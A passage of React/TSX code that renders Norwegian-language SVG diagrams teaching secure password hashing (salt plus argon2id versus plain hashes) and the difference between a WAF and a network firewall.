      <text x={20} y={92} className="fill-muted-foreground text-[9px] italic">
        Rainbow-tables + GPU brute-force knekker mesteparten på timer
      </text>

      {/* GOOD PATTERN */}
      <line x1={20} y1={108} x2={500} y2={108} className="stroke-border" strokeWidth={1} />

      <text x={20} y={130} className="fill-success text-[10px] font-semibold">
        Riktig — unik salt + argon2id
      </text>
      <rect
        x={20}
        y={138}
        width={80}
        height={26}
        rx={3}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={60} y={154} textAnchor="middle" className="fill-foreground text-[10px]">
        &quot;Sommer123&quot;
      </text>
      <rect
        x={20}
        y={170}
        width={80}
        height={22}
        rx={3}
        className="fill-amber-500/20 stroke-amber-500"
        strokeWidth={1}
      />
      <text x={60} y={185} textAnchor="middle" className="fill-foreground text-[9px]">
        salt (16 B)
      </text>
      <line x1={100} y1={151} x2={130} y2={155} className="stroke-success" strokeWidth={1} />
      <line x1={100} y1={181} x2={130} y2={172} className="stroke-success" strokeWidth={1} />
      <rect
        x={130}
        y={148}
        width={110}
        height={36}
        rx={3}
        className="fill-success/15 stroke-success"
        strokeWidth={1.2}
      />
      <text x={185} y={164} textAnchor="middle" className="fill-success text-[10px] font-semibold">
        argon2id
      </text>
      <text x={185} y={177} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        64 MB · 3 iter
      </text>
      <line
        x1={240}
        y1={166}
        x2={270}
        y2={166}
        className="stroke-muted-foreground"
        strokeWidth={1}
        markerEnd="url(#kdf-arr)"
      />
      <rect
        x={270}
        y={148}
        width={150}
        height={36}
        rx={3}
        className="fill-card stroke-muted-foreground"
        strokeWidth={1}
      />
      <text x={345} y={164} textAnchor="middle" className="fill-foreground text-[9px]">
        $argon2id$v=19$...$h
      </text>
      <text x={345} y={177} textAnchor="middle" className="fill-muted-foreground text-[8px]">
        (lagres med salt + cost)
      </text>
      <text x={430} y={168} className="fill-success text-[9px]">
        ~1 gjet/s
      </text>
      <text x={20} y={210} className="fill-muted-foreground text-[9px] italic">
        Unik salt blokkerer rainbow-tables · KDF gjør hver gjetning kostbar
      </text>
      <text x={20} y={224} className="fill-muted-foreground text-[9px]">
        Alternativer: bcrypt (eldre), scrypt (minne-hardt). Aldri MD5/SHA1/SHA256 alene.
      </text>

      <defs>
        <marker
          id="kdf-arr"
          viewBox="0 0 10 10"
          refX={9}
          refY={5}
          markerWidth={5}
          markerHeight={5}
          orient="auto"
        >
          <path d="M0 0 L10 5 L0 10 z" className="fill-foreground" />
        </marker>
      </defs>
    </svg>
  );
}

/** 12) WAF vs brannmur — lag-perspektiv */
function WafVsFirewallSvg() {
  return (
    <svg viewBox="0 0 520 240" className="w-full h-auto" aria-label="WAF vs brannmur">
      <text
        x={260}
        y={18}
        textAnchor="middle"
        className="fill-foreground text-[12px] font-semibold"
      >
        WAF og brannmur — ulike lag, supplementer ikke erstattere
      </text>

      {/* Klient */}
      <circle cx={40} cy={130} r={18} className="fill-brand/20 stroke-brand" strokeWidth={1.2} />
      <text x={40} y={134} textAnchor="middle" className="fill-foreground text-[10px]">
        klient
      </text>

      {/* Vanlig brannmur */}
      <rect
        x={90}
        y={70}
        width={120}
        height={120}
        rx={8}
        className="fill-amber-500/10 stroke-amber-500"
        strokeWidth={1.5}
      />
      <text
        x={150}
        y={90}
        textAnchor="middle"
        className="fill-amber-700 dark:fill-amber-400 text-[11px] font-semibold"
      >
        Brannmur
      </text>
      <text x={150} y={104} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        L3–L4
      </text>
      <rect
        x={102}
        y={120}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={150} y={133} textAnchor="middle" className="fill-foreground text-[9px]">
        src/dst IP
      </text>
      <rect
        x={102}
        y={142}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={150} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        port (80, 443)
      </text>
      <rect
        x={102}
        y={164}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={150} y={177} textAnchor="middle" className="fill-foreground text-[9px]">
        TCP-tilstand
      </text>

      {/* WAF */}
      <rect
        x={240}
        y={70}
        width={120}
        height={120}
        rx={8}
        className="fill-success/10 stroke-success"
        strokeWidth={1.5}
      />
      <text x={300} y={90} textAnchor="middle" className="fill-success text-[11px] font-semibold">
        WAF
      </text>
      <text x={300} y={104} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        L7 (HTTP-innhold)
      </text>
      <rect
        x={252}
        y={120}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={300} y={133} textAnchor="middle" className="fill-foreground text-[9px]">
        URI · headers
      </text>
      <rect
        x={252}
        y={142}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={300} y={155} textAnchor="middle" className="fill-foreground text-[9px]">
        body-mønstre
      </text>
      <rect
        x={252}
        y={164}
        width={96}
        height={18}
        rx={2}
        className="fill-card stroke-muted-foreground"
        strokeWidth={0.7}
      />
      <text x={300} y={177} textAnchor="middle" className="fill-foreground text-[9px]">
        SQLi · XSS-regex
      </text>

      {/* Webserver */}
      <rect
        x={400}
        y={108}
        width={100}
        height={50}
        rx={6}
        className="fill-card stroke-brand"
        strokeWidth={1.2}
      />
      <text
        x={450}
        y={130}
        textAnchor="middle"
        className="fill-foreground text-[11px] font-semibold"
      >
        Webserver
      </text>
      <text x={450} y={146} textAnchor="middle" className="fill-muted-foreground text-[9px]">
        applikasjon
      </text>

      <line
        x1={58}
        y1={130}
        x2={88}
        y2={130}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#waf-arr)"
      />
      <line
        x1={210}
        y1={130}
        x2={238}
        y2={130}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#waf-arr)"
      />
      <line
        x1={360}
        y1={130}
        x2={398}
        y2={130}
        className="stroke-foreground/50"
        strokeWidth={1.5}
        markerEnd="url(#waf-arr)"
      />

      <defs>
        <marker
          id="waf-arr"
          viewBox="0 0 10 10"
          refX={9}
          refY={5}
          markerWidth={5}
          markerHeight={5}
          orient="auto"
        >
          <path d="M0 0 L10 5 L0 10 z" className="fill-foreground" />
        </marker>
      </defs>

      <text x={260} y={215} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        Brannmur stopper portscan og uautoriserte IP-er.
      </text>
      <text x={260} y={228} textAnchor="middle" className="fill-muted-foreground text-[9px] italic">
        WAF stopper SQLi/XSS i payload som brannmuren slipper gjennom på port 443.
      </text>
    </svg>
  );
}
